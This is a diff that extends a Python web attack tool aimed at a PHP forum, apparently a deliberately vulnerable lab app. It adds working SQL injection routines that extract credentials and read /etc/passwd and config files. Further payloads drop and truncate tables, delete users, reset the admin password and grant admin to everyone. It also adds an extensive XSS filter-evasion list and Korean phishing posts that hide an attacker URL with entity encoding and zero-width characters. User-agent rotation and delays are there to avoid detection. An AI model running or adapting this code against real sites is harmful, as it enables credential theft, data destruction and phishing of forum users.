@@ -778,7 +778,535 @@ if(isset($_GET["cmd"])) {
 
         print(f"\n[*] LFI/RCE Results: {success_count} successful operations")
         return success_count > 0
-    
+
+    def test_sql_injection_advanced(self):
+        """Advanced SQL Injection tests on various endpoints after login"""
+        self.print_section("Advanced SQL Injection - Post-Authentication")
+
+        if not self.logged_in:
+            print("[-] Login required for advanced SQLi testing")
+            return False
+
+        vuln_found = False
+
+        # Test 1: Search functionality
+        print("\n" + "="*60)
+        print("[*] Phase 1: Testing Search Functionality")
+        print("="*60)
+        vuln_found |= self.test_sqli_search()
+
+        # Test 2: Profile/User lookup
+        print("\n" + "="*60)
+        print("[*] Phase 2: Testing Profile/User Lookup")
+        print("="*60)
+        vuln_found |= self.test_sqli_profile()
+
+        # Test 3: Post filtering/viewing
+        print("\n" + "="*60)
+        print("[*] Phase 3: Testing Post Viewing")
+        print("="*60)
+        vuln_found |= self.test_sqli_posts()
+
+        # Test 4: Second-Order SQL Injection
+        print("\n" + "="*60)
+        print("[*] Phase 4: Testing Second-Order SQLi")
+        print("="*60)
+        vuln_found |= self.test_sqli_second_order()
+
+        # Test 5: UNION-based Data Extraction
+        print("\n" + "="*60)
+        print("[*] Phase 5: UNION-based Data Extraction")
+        print("="*60)
+        vuln_found |= self.test_sqli_data_extraction()
+
+        # Test 6: Destructive SQL Injection
+        print("\n" + "="*60)
+        print("[*] Phase 6: Destructive SQL Injection")
+        print("="*60)
+        vuln_found |= self.test_sqli_destructive()
+
+        if vuln_found:
+            print("\n" + "="*60)
+            print("[+] ADVANCED SQLi SUMMARY: Vulnerabilities found!")
+            print("="*60)
+        else:
+            print("\n" + "="*60)
+            print("[-] No advanced SQL Injection vulnerabilities found")
+            print("="*60)
+
+        return vuln_found
+
+    def test_sqli_search(self):
+        """Test SQL Injection in search functionality"""
+        print("\n[*] Testing SQL Injection in Search...")
+
+        search_endpoints = [
+            f"{self.base_url}/search.php",
+            f"{self.base_url}/index.php",
+            f"{self.base_url}/posts.php",
+        ]
+
+        # SQLi payloads optimized for search
+        search_payloads = [
+            ("' OR 1=1--", "Basic OR bypass"),
+            ("' UNION SELECT NULL,NULL,NULL--", "Union 3 cols"),
+            ("' UNION SELECT NULL,NULL,NULL,NULL--", "Union 4 cols"),
+            ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "Union 5 cols"),
+            ("' UNION SELECT 1,2,3--", "Union with numbers 3"),
+            ("' UNION SELECT 1,2,3,4--", "Union with numbers 4"),
+            ("' UNION SELECT 1,2,3,4,5--", "Union with numbers 5"),
+            ("' UNION SELECT username,password,NULL FROM users--", "Extract users 3 cols"),
+            ("' UNION SELECT NULL,username,password,NULL FROM users--", "Extract users 4 cols"),
+            ("' UNION SELECT NULL,username,password,email,NULL FROM users--", "Extract users 5 cols"),
+            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "Table enumeration"),
+            ("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns--", "Column enumeration"),
+            ("' AND 1=2 UNION SELECT database(),user(),version()--", "DB info"),
+            ("' OR 'x'='x", "Simple OR"),
+            ("admin' ORDER BY 1--", "ORDER BY column count 1"),
+            ("admin' ORDER BY 2--", "ORDER BY column count 2"),
+            ("admin' ORDER BY 3--", "ORDER BY column count 3"),
+            ("admin' ORDER BY 4--", "ORDER BY column count 4"),
+            ("admin' ORDER BY 5--", "ORDER BY column count 5"),
+        ]
+
+        param_names = ['q', 'search', 'query', 'keyword', 's', 'term']
+
+        for endpoint in search_endpoints:
+            for param in param_names:
+                for payload, desc in search_payloads:
+                    try:
+                        self._rotate_user_agent()
+                        self._random_delay(0.5, 1.5)
+
+                        params = {param: payload}
+                        response = self.session.get(endpoint, params=params, timeout=15)
+
+                        # Check for SQL errors
+                        sql_errors = [
+                            'sql syntax', 'mysql', 'mysqli', 'postgresql',
+                            'warning:', 'error in your sql', 'pg_query',
+                            'sqlite', 'odbc', 'oracle', 'mssql',
+                            'unknown column', 'table', 'syntax error'
+                        ]
+
+                        error_found = any(err in response.text.lower() for err in sql_errors)
+
+                        if error_found:
+                            print(f"\n[+] POTENTIAL SQLi FOUND!")
+                            print(f"    Endpoint: {endpoint}")
+                            print(f"    Parameter: {param}")
+                            print(f"    Payload: {payload}")
+                            print(f"    Description: {desc}")
+
+                            # Extract error message
+                            soup = BeautifulSoup(response.text, 'html.parser')
+                            error_text = response.text[:500]
+                            for err in sql_errors:
+                                if err in response.text.lower():
+                                    idx = response.text.lower().find(err)
+                                    error_text = response.text[max(0, idx-50):idx+200]
+                                    break
+
+                            print(f"    Error preview: {error_text[:300]}")
+
+                            vuln_info = {
+                                'url': endpoint,
+                                'parameter': param,
+                                'payload': payload,
+                                'description': f'SQL Injection in search: {desc}',
+                                'error': error_text[:500],
+                                'impact': 'CRITICAL - Database access, data extraction possible',
+                                'cvss_score': 9.8
+                            }
+                            self.vulnerabilities['sql_injection'].append(vuln_info)
+
+                            self.log_event(
+                                'SQL_INJECTION_SEARCH',
+                                f'SQL Injection found in {endpoint}?{param}=...',
+                                'CRITICAL',
+                                {'endpoint': endpoint, 'parameter': param, 'payload': payload}
+                            )
+
+                            return True
+
+                        # Check for successful UNION injection (data in response)
+                        if 'union' in payload.lower():
+                            if re.search(r'root|admin|user|password|database|mysql', response.text, re.I):
+                                print(f"\n[+] POSSIBLE UNION SQLi SUCCESS!")
+                                print(f"    Endpoint: {endpoint}?{param}={payload}")
+                                print(f"    Response contains DB keywords")
+
+                    except Exception as e:
+                        continue
+
+        print("[-] No SQL Injection found in search functionality")
+        return False
+
+    def test_sqli_profile(self):
+        """Test SQL Injection in profile/user lookup"""
+        print("\n[*] Testing SQL Injection in Profile/User Lookup...")
+
+        profile_endpoints = [
+            f"{self.base_url}/profile.php",
+            f"{self.base_url}/user.php",
+            f"{self.base_url}/view_profile.php",
+        ]
+
+        # ID-based SQLi payloads
+        id_payloads = [
+            ("1' OR '1'='1", "OR bypass"),
+            ("1' UNION SELECT 1,2,3--", "Union 3"),
+            ("1' UNION SELECT 1,2,3,4--", "Union 4"),
+            ("1' UNION SELECT NULL,username,password,email FROM users WHERE id=1--", "Extract user data"),
+            ("1' AND 1=2 UNION SELECT table_name,NULL,NULL FROM information_schema.tables--", "Table enum"),
+            ("1 OR 1=1", "Numeric OR"),
+            ("1 UNION SELECT 1,2,3", "Numeric union"),
+            ("-1' UNION SELECT username,password,email FROM users--", "Negative ID union"),
+        ]
+
+        param_names = ['id', 'user', 'user_id', 'uid', 'profile_id']
+
+        for endpoint in profile_endpoints:
+            for param in param_names:
+                for payload, desc in id_payloads:
+                    try:
+                        self._rotate_user_agent()
+                        self._random_delay(0.5, 1.5)
+
+                        params = {param: payload}
+                        response = self.session.get(endpoint, params=params, timeout=15)
+
+                        # Check for SQL errors
+                        if any(err in response.text.lower() for err in ['sql', 'mysql', 'error', 'warning', 'syntax']):
+                            print(f"\n[+] POTENTIAL SQLi in Profile!")
+                            print(f"    URL: {endpoint}?{param}={payload}")
+                            print(f"    Type: {desc}")
+
+                            vuln_info = {
+                                'url': endpoint,
+                                'parameter': param,
+                                'payload': payload,
+                                'description': f'SQL Injection in profile lookup: {desc}',
+                                'impact': 'CRITICAL - User data extraction, authentication bypass',
+                                'cvss_score': 9.1
+                            }
+                            self.vulnerabilities['sql_injection'].append(vuln_info)
+
+                            return True
+
+                    except Exception:
+                        continue
+
+        print("[-] No SQL Injection found in profile functionality")
+        return False
+
+    def test_sqli_posts(self):
+        """Test SQL Injection in post viewing/filtering"""
+        print("\n[*] Testing SQL Injection in Post Viewing...")
+
+        post_endpoints = [
+            f"{self.base_url}/post.php",
+            f"{self.base_url}/view_post.php",
+            f"{self.base_url}/index.php",
+        ]
+
+        # Post ID SQLi payloads
+        post_payloads = [
+            ("1' OR '1'='1'--", "OR bypass"),
+            ("1' UNION SELECT 1,2,3,4--", "Union extract"),
+            ("1' AND SLEEP(5)--", "Time-based blind"),
+            ("1' AND (SELECT COUNT(*) FROM users)>0--", "Boolean blind"),
+        ]
+
+        param_names = ['id', 'post_id', 'p', 'post']
+
+        for endpoint in post_endpoints:
+            for param in param_names:
+                for payload, desc in post_payloads:
+                    try:
+                        self._rotate_user_agent()
+                        self._random_delay(0.5, 1.5)
+
+                        params = {param: payload}
+                        start_time = time.time()
+                        response = self.session.get(endpoint, params=params, timeout=15)
+                        elapsed = time.time() - start_time
+
+                        # Check for SQL errors
+                        if any(err in response.text.lower() for err in ['sql', 'mysql', 'error']):
+                            print(f"\n[+] SQLi in Posts: {endpoint}?{param}={payload}")
+                            return True
+
+                        # Check for time-based SQLi
+                        if 'sleep' in payload.lower() and elapsed > 4:
+                            print(f"\n[+] TIME-BASED SQLi FOUND!")
+                            print(f"    URL: {endpoint}?{param}={payload}")
+                            print(f"    Response time: {elapsed:.2f}s")
+
+                            vuln_info = {
+                                'url': endpoint,
+                                'parameter': param,
+                                'payload': payload,
+                                'description': 'Time-based Blind SQL Injection in posts',
+                                'response_time': elapsed,
+                                'impact': 'CRITICAL - Blind SQLi allows data extraction',
+                                'cvss_score': 8.6
+                            }
+                            self.vulnerabilities['sql_injection'].append(vuln_info)
+                            return True
+
+                    except Exception:
+                        continue
+
+        print("[-] No SQL Injection found in post functionality")
+        return False
+
+    def test_sqli_second_order(self):
+        """Test Second-Order SQL Injection"""
+        print("\n[*] Testing Second-Order SQL Injection...")
+
+        # Second-order: Inject payload via profile update, check if executed elsewhere
+        second_order_payloads = [
+            "admin' OR '1'='1'--",
+            "<script>alert('XSS')</script>",
+            "'; DROP TABLE posts--",
+        ]
+
+        profile_url = f"{self.base_url}/profile.php"
+
+        for payload in second_order_payloads:
+            try:
+                self._rotate_user_agent()
+                self._random_delay(1, 2)
+
+                # Try to update username/bio with payload
+                data = {'username': payload, 'bio': payload}
+                response = self.session.post(profile_url, data=data, timeout=15)
+
+                # Check if it causes errors when retrieved
+                time.sleep(1)
+                check = self.session.get(f"{self.base_url}/index.php", timeout=15)
+
+                if any(err in check.text.lower() for err in ['sql', 'mysql', 'error']):
+                    print(f"\n[+] SECOND-ORDER SQLi DETECTED!")
+                    print(f"    Injected via: profile update")
+                    print(f"    Triggered on: index page")
+                    print(f"    Payload: {payload}")
+
+                    vuln_info = {
+                        'url': profile_url,
+                        'payload': payload,
+                        'description': 'Second-Order SQL Injection via profile',
+                        'impact': 'CRITICAL - Stored SQLi, affects other users',
+                        'cvss_score': 9.3
+                    }
+                    self.vulnerabilities['sql_injection'].append(vuln_info)
+                    return True
+
+            except Exception:
+                continue
+
+        print("[-] No Second-Order SQL Injection found")
+        return False
+
+    def test_sqli_data_extraction(self):
+        """Extract sensitive data using UNION-based SQL Injection"""
+        print("\n[*] Testing UNION-based Data Extraction...")
+
+        # Common endpoints that might be vulnerable
+        test_endpoints = [
+            (f"{self.base_url}/search.php", 'q'),
+            (f"{self.base_url}/profile.php", 'id'),
+            (f"{self.base_url}/post.php", 'id'),
+            (f"{self.base_url}/index.php", 'search'),
+        ]
+
+        # Data extraction payloads
+        extraction_payloads = [
+            # Extract all usernames and passwords
+            ("' UNION SELECT username,password,email FROM users--", "Extract user credentials"),
+            ("' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--", "Extract credentials concat"),
+
+            # Extract database structure
+            ("' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--", "Extract table names"),
+            ("' UNION SELECT column_name,table_name,NULL FROM information_schema.columns WHERE table_schema=database()--", "Extract column names"),
+
+            # Extract specific data
+            ("' UNION SELECT id,username,password FROM users WHERE username='admin'--", "Extract admin credentials"),
+            ("' UNION SELECT database(),user(),version()--", "Extract DB info"),
+
+            # File read attempts
+            ("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--", "Read /etc/passwd"),
+            ("' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--", "Read config.php"),
+        ]
+
+        for endpoint, param in test_endpoints:
+            for payload, desc in extraction_payloads:
+                try:
+                    self._rotate_user_agent()
+                    self._random_delay(0.5, 1.0)
+
+                    params = {param: payload}
+                    response = self.session.get(endpoint, params=params, timeout=15)
+
+                    # Check if we got data
+                    suspicious_patterns = [
+                        r'admin.*:\$',  # password hashes
+                        r'root:x:0:0',  # /etc/passwd
+                        r'DB_PASSWORD',  # config files
+                        r'mysql_',  # mysql functions
+                        r'\$2[aby]\$',  # bcrypt hashes
+                        r'[a-f0-9]{32}',  # MD5 hashes
+                    ]
+
+                    for pattern in suspicious_patterns:
+                        if re.search(pattern, response.text, re.I):
+                            print(f"\n[+] DATA EXTRACTION SUCCESS!")
+                            print(f"    Endpoint: {endpoint}")
+                            print(f"    Parameter: {param}")
+                            print(f"    Payload: {payload}")
+                            print(f"    Type: {desc}")
+                            print(f"    Extracted data preview: {response.text[:500]}")
+
+                            vuln_info = {
+                                'url': endpoint,
+                                'parameter': param,
+                                'payload': payload,
+                                'description': f'Data extraction via UNION SQLi: {desc}',
+                                'extracted_data': response.text[:1000],
+                                'impact': 'CRITICAL - Sensitive data exposed (credentials, config files)',
+                                'cvss_score': 9.8
+                            }
+                            self.vulnerabilities['sql_injection'].append(vuln_info)
+
+                            self.log_event(
+                                'SQL_DATA_EXTRACTION',
+                                f'Sensitive data extracted via SQLi: {desc}',
+                                'CRITICAL',
+                                {'endpoint': endpoint, 'type': desc}
+                            )
+
+                            return True
+
+                except Exception:
+                    continue
+
+        print("[-] No data extraction via UNION SQLi")
+        return False
+
+    def test_sqli_destructive(self):
+        """Test destructive SQL Injection attacks (UPDATE, DELETE, DROP)"""
+        print("\n[*] Testing Destructive SQL Injection Attacks...")
+        print("[!] WARNING: These attacks will modify/destroy database data!")
+
+        # Find a vulnerable endpoint first
+        test_endpoints = [
+            (f"{self.base_url}/search.php", 'q'),
+            (f"{self.base_url}/profile.php", 'id'),
+            (f"{self.base_url}/post.php", 'id'),
+        ]
+
+        # Destructive payloads (use with caution!)
+        destructive_payloads = [
+            # Point manipulation
+            ("'; UPDATE users SET points=999999 WHERE username='admin'--", "Grant admin 999999 points"),
+            ("'; UPDATE users SET points=999999 WHERE id=1--", "Grant user ID 1 max points"),
+            ("'; UPDATE users SET points=points+10000--", "Add 10000 points to all users"),
+
+            # Privilege escalation
+            ("'; UPDATE users SET role='admin' WHERE username='admin'--", "Elevate to admin role"),
+            ("'; UPDATE users SET is_admin=1--", "Make all users admin"),
+
+            # Password reset
+            ("'; UPDATE users SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' WHERE username='admin'--", "Reset admin password to 'password'"),
+
+            # Data deletion
+            ("'; DELETE FROM posts WHERE id>0--", "Delete all posts"),
+            ("'; DELETE FROM users WHERE username!='admin'--", "Delete non-admin users"),
+            ("'; TRUNCATE TABLE posts--", "Truncate posts table"),
+            ("'; TRUNCATE TABLE logs--", "Truncate logs table"),
+
+            # Table dropping (extreme)
+            ("'; DROP TABLE posts--", "Drop posts table"),
+            ("'; DROP TABLE logs--", "Drop logs table"),
+            ("'; DROP TABLE sessions--", "Drop sessions table"),
+
+            # Database destruction (most severe)
+            ("'; DROP DATABASE IF EXISTS vulnerable_db--", "Drop entire database"),
+        ]
+
+        for endpoint, param in test_endpoints:
+            for payload, desc in destructive_payloads:
+                try:
+                    self._rotate_user_agent()
+                    self._random_delay(1.0, 2.0)
+
+                    print(f"\n[*] Attempting: {desc}")
+                    print(f"    Payload: {payload[:80]}...")
+
+                    params = {param: payload}
+                    response = self.session.get(endpoint, params=params, timeout=15)
+
+                    # Check if attack succeeded (look for changes)
+                    if response.status_code == 200:
+                        # Verify the attack worked
+                        check_response = self.session.get(f"{self.base_url}/index.php", timeout=15)
+
+                        # Check for signs of success
+                        success_indicators = []
+
+                        # Check if points changed
+                        if 'points' in payload.lower():
+                            if '999999' in check_response.text or '99999' in check_response.text:
+                                success_indicators.append("Points modified to 999999")
+
+                        # Check if posts were deleted
+                        if 'delete from posts' in payload.lower() or 'truncate table posts' in payload.lower():
+                            soup = BeautifulSoup(check_response.text, 'html.parser')
+                            posts = soup.find_all('div', class_='post')
+                            if len(posts) == 0:
+                                success_indicators.append("All posts deleted")
+
+                        # Check if table was dropped
+                        if 'drop table' in payload.lower():
+                            if 'error' in check_response.text.lower() and 'table' in check_response.text.lower():
+                                success_indicators.append("Table dropped (errors indicate missing table)")
+
+                        if success_indicators:
+                            print(f"[+] DESTRUCTIVE ATTACK SUCCESS!")
+                            print(f"    Attack: {desc}")
+                            print(f"    Evidence: {', '.join(success_indicators)}")
+
+                            vuln_info = {
+                                'url': endpoint,
+                                'parameter': param,
+                                'payload': payload,
+                                'description': f'Destructive SQL Injection: {desc}',
+                                'damage': success_indicators,
+                                'impact': 'CRITICAL - Database integrity compromised, data loss',
+                                'cvss_score': 10.0
+                            }
+                            self.vulnerabilities['sql_injection'].append(vuln_info)
+
+                            self.log_event(
+                                'SQL_DESTRUCTIVE',
+                                f'Destructive SQLi attack successful: {desc}',
+                                'CRITICAL',
+                                {
+                                    'endpoint': endpoint,
+                                    'attack': desc,
+                                    'damage': success_indicators
+                                }
+                            )
+
+                            return True
+
+                except Exception as e:
+                    continue
+
+        print("[-] No destructive SQL Injection succeeded")
+        return False
+
     def clear_old_posts(self):
         """Check and optionally clear old posts with incorrect attacker server URLs"""
         self.print_section("Checking for Old Posts")
@@ -836,16 +1364,109 @@ if(isset($_GET["cmd"])) {
 
         post_url = f"{self.base_url}/new_post.php"
 
-        # XSS payloads to test
+        # XSS payloads to test - extensive evasion techniques
         xss_payloads = [
+            # Basic payloads
             ('<script>alert("XSS")</script>', 'Basic script tag'),
-            ('<img src=x onerror=alert("XSS")>', 'Image onerror event'),
-            ('<svg/onload=alert("XSS")>', 'SVG onload event'),
-            ('"><script>alert("XSS")</script>', 'Breaking out of attribute'),
-            ('<iframe src="javascript:alert(\'XSS\')"></iframe>', 'Iframe javascript protocol'),
-            ('<body onload=alert("XSS")>', 'Body onload'),
-            ('<input onfocus=alert("XSS") autofocus>', 'Input autofocus'),
-            ('<marquee onstart=alert("XSS")>', 'Marquee onstart'),
+            ('<script>alert(1)</script>', 'Numeric alert'),
+
+            # Case variation
+            ('<ScRiPt>alert(1)</ScRiPt>', 'Mixed case script'),
+            ('<SCRIPT>alert(1)</SCRIPT>', 'Uppercase script'),
+
+            # Image-based XSS
+            ('<img src=x onerror=alert(1)>', 'Image onerror'),
+            ('<img src=x onerror="alert(1)">', 'Image onerror quoted'),
+            ('<img src=x onerror=alert(String.fromCharCode(88,83,83))>', 'Image with fromCharCode'),
+            ('<img/src=x onerror=alert(1)>', 'Image with slash'),
+            ('<img src="x" onerror="alert(1)">', 'Image fully quoted'),
+            ('<img src onerror=alert(1)>', 'Image no value'),
+
+            # SVG-based XSS
+            ('<svg/onload=alert(1)>', 'SVG onload'),
+            ('<svg onload=alert(1)>', 'SVG onload no slash'),
+            ('<svg><script>alert(1)</script></svg>', 'SVG with script'),
+            ('<svg><animatetransform onbegin=alert(1)>', 'SVG animate'),
+
+            # Event handlers
+            ('<body onload=alert(1)>', 'Body onload'),
+            ('<input onfocus=alert(1) autofocus>', 'Input autofocus'),
+            ('<select onfocus=alert(1) autofocus>', 'Select autofocus'),
+            ('<textarea onfocus=alert(1) autofocus>', 'Textarea autofocus'),
+            ('<marquee onstart=alert(1)>', 'Marquee onstart'),
+            ('<details open ontoggle=alert(1)>', 'Details ontoggle'),
+
+            # Iframe-based
+            ('<iframe src="javascript:alert(1)"></iframe>', 'Iframe javascript'),
+            ('<iframe src=javascript:alert(1)>', 'Iframe javascript unquoted'),
+
+            # Encoding bypass
+            ('<script>alert(String.fromCharCode(88,83,83))</script>', 'fromCharCode encoding'),
+            ('<script>eval(atob("YWxlcnQoMSk="))</script>', 'Base64 eval'),
+            ('<script>\u0061lert(1)</script>', 'Unicode escape'),
+            ('<script>alert\u0028 1\u0029</script>', 'Unicode parentheses'),
+
+            # Obfuscation
+            ('<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>', 'Eval fromCharCode'),
+            ('<script>setTimeout(alert,0,1)</script>', 'setTimeout'),
+            ('<script>setInterval(alert,100,1)</script>', 'setInterval'),
+            ('<script>[].constructor.constructor("alert(1)")()</script>', 'Constructor trick'),
+
+            # Breaking out of context
+            ('"><script>alert(1)</script>', 'Quote break'),
+            ("'><script>alert(1)</script>", 'Single quote break'),
+            ('</script><script>alert(1)</script>', 'Close and reopen'),
+            ('"><img src=x onerror=alert(1)>', 'Quote to img'),
+
+            # HTML5 specific
+            ('<form><button formaction=javascript:alert(1)>X</button>', 'Form button'),
+            ('<object data="javascript:alert(1)">', 'Object data'),
+            ('<embed src="javascript:alert(1)">', 'Embed src'),
+            ('<isindex type=image src=1 onerror=alert(1)>', 'Isindex'),
+
+            # Filter bypass attempts
+            ('<<script>alert(1)//<<//script>', 'Double angle bracket'),
+            ('<script>alert(1)<!--', 'HTML comment'),
+            ('<script>alert(1)//--></script>', 'Comment bypass'),
+            ('<scr<script>ipt>alert(1)</scr</script>ipt>', 'Nested script'),
+
+            # Null byte
+            ('<script\x00>alert(1)</script>', 'Null byte in tag'),
+            ('<img src=x\x00 onerror=alert(1)>', 'Null byte in attribute'),
+
+            # Space alternatives
+            ('<img/src=x/onerror=alert(1)>', 'Slash as space'),
+            ('<img\tsrc=x\tonerror=alert(1)>', 'Tab as space'),
+            ('<img\nsrc=x\nonerror=alert(1)>', 'Newline as space'),
+
+            # Protocol variations
+            ('<a href="javascript:alert(1)">click</a>', 'Link javascript'),
+            ('<a href="java\tscript:alert(1)">click</a>', 'Tab in protocol'),
+            ('<a href="java\nscript:alert(1)">click</a>', 'Newline in protocol'),
+            ('<a href="&#106;avascript:alert(1)">click</a>', 'Entity encoded protocol'),
+
+            # Polyglot attempts
+            ('jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e', 'Polyglot XSS'),
+
+            # Event handler variations
+            ('<svg><animate onbegin=alert(1) attributeName=x dur=1s>', 'SVG animate onbegin'),
+            ('<video><source onerror="alert(1)">', 'Video source error'),
+            ('<audio src=x onerror=alert(1)>', 'Audio error'),
+
+            # Without parentheses
+            ('<script>onerror=alert;throw 1</script>', 'No parentheses throw'),
+            ('<script>{onerror=alert}throw 1</script>', 'No parentheses block'),
+
+            # Template literals
+            ('<script>alert`1`</script>', 'Template literal'),
+
+            # Short payloads
+            ('<script>alert()</script>', 'Empty alert'),
+            ('<svg onload=alert()>', 'SVG empty alert'),
+
+            # Data URL
+            ('<script src="data:text/javascript,alert(1)"></script>', 'Data URL script'),
+            ('<img src="data:image/svg+xml,<svg onload=alert(1)>">', 'Data URL SVG'),
         ]
 
         xss_found = False
@@ -863,9 +1484,23 @@ if(isset($_GET["cmd"])) {
                 headers['Origin'] = self.base_url
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
+                print(f"    Sending data: {data}")
                 response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
 
                 print(f"    Status: {response.status_code}")
+                print(f"    Response URL: {response.url}")
+                print(f"    Response preview: {response.text[:200]}")
+
+                # Check for specific error messages
+                if 'error' in response.text.lower():
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    error_msg = soup.find(class_=re.compile(r'error|alert|warning'))
+                    if error_msg:
+                        print(f"    Error detected: {error_msg.get_text(strip=True)[:150]}")
+
+                # Check if redirected back to new_post (failed)
+                if 'new_post' in response.url:
+                    print(f"    Warning: Redirected back to new_post page - submission likely rejected")
 
                 # Check if payload is reflected without sanitization
                 time.sleep(0.5)
@@ -945,8 +1580,11 @@ if(isset($_GET["cmd"])) {
 
         # Try multiple payload variations to bypass filters
         payloads_to_try = [
+            # Warm-up posts (establish legitimacy)
             (f'''안녕하세요! 좋은 하루 되세요 😊''', 'Innocent warm-up post'),
+            (f'''오늘 날씨 좋네요!''', 'Weather comment'),
 
+            # Direct link variations
             (f'''🎁 무료 포인트 이벤트
 링크: {attacker_url}
 서두르세요!''', 'Direct link with emojis'),
@@ -956,6 +1594,58 @@ if(isset($_GET["cmd"])) {
 참여 부탁드립니다''', 'Simple announcement'),
 
             (f'''이벤트 링크: {attacker_url}''', 'Simple link'),
+
+            # Link obfuscation attempts
+            (f'''포인트 이벤트: {attacker_url.replace("http://", "")}''', 'No http prefix'),
+            (f'''선물 받기: {attacker_url.replace("://", "&#58;//")}''', 'HTML entity in URL'),
+            (f'''클릭하세요: {attacker_url.replace(":", "&#x3A;")}''', 'Hex entity in URL'),
+
+            # URL shortening simulation
+            (f'''이벤트 참여
+{attacker_url}
+지금 바로!''', 'Multiline with URL'),
+
+            # Without explicit URL mention
+            (f'''무료 선물 이벤트가 진행중입니다!
+여기로 오세요: {attacker_url}''', 'Invitation style'),
+
+            # Encoded characters
+            (f'''포인트 받기&#10;{attacker_url}''', 'With HTML newline'),
+            (f'''이벤트&#x20;링크:&#x20;{attacker_url}''', 'With HTML spaces'),
+
+            # Markdown-style links (if supported)
+            (f'''[무료 포인트 받기]({attacker_url})''', 'Markdown link'),
+            (f'''[클릭]({attacker_url}) 하세요!''', 'Short markdown'),
+
+            # HTML anchor attempts
+            (f'''<a href="{attacker_url}">무료 선물</a>''', 'HTML anchor tag'),
+            (f'''<a href={attacker_url}>이벤트</a>''', 'Unquoted anchor'),
+
+            # Mixed encoding
+            (f'''선물 이벤트
+%68%74%74%70://{attacker_url.split("://")[1]}''', 'URL encoded http'),
+
+            # Plain text variations
+            (f'''{attacker_url}
+무료 포인트 받으세요''', 'URL first'),
+            (f'''선물 이벤트 {attacker_url} 참여하세요''', 'Inline URL'),
+
+            # Unicode tricks
+            (f'''이벤트: {attacker_url}''', 'Unicode char'),
+
+            # Zero-width characters (invisible)
+            (f'''포인트{chr(0x200b)}이벤트{chr(0x200b)}: {attacker_url}''', 'Zero-width spaces'),
+
+            # Different spacing
+            (f'''포인트 이벤트
+
+{attacker_url}
+
+참여하세요!''', 'Extra spacing'),
+
+            # Reversed words (creative)
+            (f'''tneve tniop eerf
+{attacker_url}''', 'Reversed text'),
         ]
 
         for payload, desc in payloads_to_try:
@@ -972,11 +1662,24 @@ if(isset($_GET["cmd"])) {
                 headers['Origin'] = self.base_url
                 headers['Content-Type'] = 'application/x-www-form-urlencoded'
 
+                print(f"    Sending data: {data}")
                 response = self.session.post(post_url, data=data, headers=headers, allow_redirects=True, timeout=30)
 
                 print(f"    Status Code: {response.status_code}")
                 print(f"    Final URL: {response.url}")
                 print(f"    Response Length: {len(response.text)}")
+                print(f"    Response preview: {response.text[:300]}")
+
+                # Check if redirected back to new_post (failed)
+                if 'new_post' in response.url:
+                    print(f"    Warning: Redirected back to new_post page - submission likely rejected")
+
+                # Check for specific error messages
+                if 'error' in response.text.lower():
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    error_msg = soup.find(class_=re.compile(r'error|alert|warning'))
+                    if error_msg:
+                        print(f"    Error detected: {error_msg.get_text(strip=True)[:150]}")
 
                 # Check for WAF/error messages
                 if 'block' in response.text.lower() or 'forbidden' in response.text.lower() or 'denied' in response.text.lower():
@@ -2250,27 +2953,32 @@ Immediate remediation is strongly recommended to prevent unauthorized access and
         self._random_delay(2.0, 5.0)
         self.test_file_upload_rce()
 
-        # 3. LFI
+        # 3. Advanced SQL Injection (post-auth)
+        print("\n[*] Testing advanced SQL injection attacks...")
+        self._random_delay(2.0, 4.0)
+        self.test_sql_injection_advanced()
+
+        # 4. LFI
         print("\n[*] Testing local file inclusion...")
         self._random_delay(2.0, 4.0)
         self.test_lfi()
 
-        # 4. Check for old posts with incorrect attacker URLs
+        # 5. Check for old posts with incorrect attacker URLs
         print("\n[*] Checking for old malicious posts...")
         self._random_delay(1.0, 2.0)
         self.clear_old_posts()
 
-        # 5. Test Stored XSS
+        # 6. Test Stored XSS
         print("\n[*] Testing Stored XSS vulnerabilities...")
         self._random_delay(2.0, 4.0)
         self.test_xss_stored()
 
-        # 6. Test CSRF Phishing
+        # 7. Test CSRF Phishing
         print("\n[*] Testing CSRF phishing attacks...")
         self._random_delay(3.0, 6.0)
         self.test_csrf_phishing()
 
-        # 7. fake-gift 페이지 생성
+        # 8. fake-gift 페이지 생성
         self.generate_fake_gift_page()
         
         self.log_event('SCAN_COMPLETE', f'Security assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
